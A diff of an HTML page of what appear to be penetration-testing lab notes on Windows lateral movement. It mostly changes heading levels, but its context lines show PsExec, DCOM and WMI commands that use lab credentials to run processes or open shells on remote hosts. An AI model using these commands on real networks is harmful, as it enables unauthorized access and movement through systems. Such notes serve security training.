@@ -173,15 +173,14 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="lateral-movement"><a class="header" href="#lateral-movement">Lateral Movement</a></h1>
+                        <h2 id="lateral-movement"><a class="header" href="#lateral-movement">Lateral Movement</a></h2>
 <h3 id="links"><a class="header" href="#links">Links</a></h3>
 <ul>
 <li><a href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/">Pass the Hash</a></li>
 <li><a href="https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#lateral-movement">AD Cheat Sheet</a></li>
-<li></li>
 </ul>
 <p>Hey, Why are you here? Do you have HASH or PASSWORD? Users Hash and Kerberos Ticket. Why crack Hashes and Passwords when you can pass them?</p>
-<h2 id="psexec"><a class="header" href="#psexec">PsExec</a></h2>
+<h3 id="psexec"><a class="header" href="#psexec">PsExec</a></h3>
 <pre><code>
 ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
 hostname
@@ -236,7 +235,7 @@ ls \\web04\backup
 
 
 </code></pre>
-<h2 id="dcom"><a class="header" href="#dcom">DCOM</a></h2>
+<h3 id="dcom"><a class="header" href="#dcom">DCOM</a></h3>
 <pre><code>
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.189.72"))
 
@@ -251,7 +250,7 @@ whoami
 hostname
 
 </code></pre>
-<h2 id="wmi-and-winrm"><a class="header" href="#wmi-and-winrm">WMI and WinRM</a></h2>
+<h3 id="wmi-and-winrm"><a class="header" href="#wmi-and-winrm">WMI and WinRM</a></h3>
 <pre><code>
 
 wmic /node:192.168.189.73 /user:jen /password:Nexus123! process call create "calc"
